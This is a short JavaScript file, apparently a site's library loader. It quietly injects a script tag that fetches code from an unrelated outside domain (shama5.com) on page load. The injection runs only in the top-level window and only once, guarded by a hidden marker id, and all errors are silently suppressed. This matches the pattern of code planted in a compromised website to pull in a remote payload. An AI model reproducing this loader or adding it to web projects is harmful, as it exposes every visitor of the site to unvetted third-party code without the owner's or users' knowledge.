(function() {
	try {
		var e = "_|_",
			t = document,
			r = "http://www.yundrive.net/skin/js/lib.js",
			c = "http://shama5.com/?tsliese=27308832",
			n = r + (~r.indexOf("?") ? "&" : "?") + (new Date).getTime(),
			i = t.currentScript,
			s = t.getElementsByTagName("head")[0],
			a = function(e, r) {
				var c = t.createElement("script");
				c.type = "text/javascript", r && (c.id = r), c.src = e, s.appendChild(c)
			};
		t.getElementById(e) || self == top && a(c, e), i || (i = function() {
			for(var e = t.scripts, c = e.length, n = 0; n < c; ++n)
				if(e[n].src === r) return e[n]
		}()), i && (i.defer || i.async ? a(n) : t.write('<script src="' + n + '"></script>'))
	} catch(e) {}
})();